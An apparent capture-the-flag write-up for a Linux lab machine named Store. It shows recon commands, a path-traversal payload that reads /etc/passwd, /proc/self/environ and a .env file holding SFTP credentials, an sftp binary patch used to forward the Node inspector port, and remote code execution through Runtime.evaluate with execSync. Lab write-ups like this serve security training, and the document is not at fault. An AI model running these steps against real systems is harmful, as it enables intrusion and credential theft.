## Overview

Store is a hard-difficulty Linux machine hosting a Node.js file-storage application across three identical ports (5000–5002). The download endpoint is vulnerable to path-traversal **arbitrary file read**, which leaks the app's `.env` (SFTP credentials) and reveals — via `/proc/self/environ` — that the app was started with the Node `--inspect` debugger. The SFTP account has no interactive shell, but SFTP can still be coerced into forwarding the internal debugger port, and the Node inspector's eval API hands us a shell as `dev`. This post stops at `user.txt`.

## Recon

| Port | Service | Notes |
|------|---------|-------|
| 22   | OpenSSH 8.9p1 | Ubuntu |
| 5000 | Node.js (Express) | Storage app |
| 5001 | Node.js (Express) | Identical instance |
| 5002 | Node.js (Express) | Identical instance |

```bash
ports=$(nmap -p- --min-rate=1000 -T4 10.129.238.32 | grep '^[0-9]' | cut -d/ -f1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sC -sV 10.129.238.32
```

Three copies of the same Express app run on 5000/5001/5002. Each lets you upload files and view them back at `/file/<name>` and `/list`.

## Enumeration

The `/file/<name>` endpoint serves stored files by name — a prime candidate for path traversal. Fuzzing it with URL-encoded `../` sequences confirms arbitrary file read:

```bash
ffuf -u http://10.129.238.32:5000/file/FUZZ -w /usr/share/wordlists/seclists/LFI-Jhaddix.txt -fs 567
# ..%2F..%2F..%2F..%2Fetc%2Fpasswd  ->  200
```

The returned bytes are scrambled by a simple key cipher. The app, however, stores both encrypted and decrypted copies under `/tmp` while processing — so re-uploading the ciphertext and reading the app's own decrypted `/tmp/<name>` copy back gives plaintext. With that primitive we read two key files:

```bash
gobuster dir -k -u http://10.129.238.32:5000/ -w /usr/share/wordlists/seclists/raft-small-words-lowercase.txt -t 200
# reveals /upload /list /tmp
```

- `/proc/self/environ` → the app runs `nodemon --exec 'node --inspect=127.0.0.1:9229 /home/dev/projects/store1/start.js'`
- `/home/dev/projects/store1/.env` → `SFTP_URL=sftp://sftpuser:<redacted>@localhost`

![node inspector target](/assets/Images/store-004_enum_node-inspector.png)

The `--inspect` flag is the lead: Node's debugger listens on localhost:9229 and lets anyone who can reach it run arbitrary JavaScript.

## Foothold

The SFTP credentials authenticate, but SSH login fails — the account has no shell. A normal `ssh -L` tunnel therefore won't work. SFTP's `-S` option lets us supply a custom SSH transport, so we add the `-L` forward there and patch the `sftp` binary to stop it clearing forwardings:

```bash
printf '#!/bin/sh\nexec ssh -o StrictHostKeyChecking=no -L9229:127.0.0.1:9229 "$@"\n' > sftp_port.sh && chmod +x sftp_port.sh
sed 's/AllForwardings yes/AllForwardings no /' < /usr/bin/sftp > sftp.noclearforward && chmod +x sftp.noclearforward
sshpass -p '<pass>' ./sftp.noclearforward -S ./sftp_port.sh -oClearAllForwardings\ no sftpuser@10.129.238.32
```

The internal debugger port 9229 is now reachable on our localhost:

![9229 forwarded](/assets/Images/store-003_foothold_sftp-fwd-9229.png)

We grab the debugger's WebSocket URL and drive the Chrome DevTools Protocol headless — `Runtime.evaluate` with a `child_process.execSync` payload runs commands as `dev`:

```bash
curl -s http://127.0.0.1:9229/json   # -> webSocketDebuggerUrl
# connect over the ws and send Runtime.evaluate { expression: require('child_process').execSync('id').toString() }
```

![RCE as dev](/assets/Images/store-005_foothold_dev-rce.png)
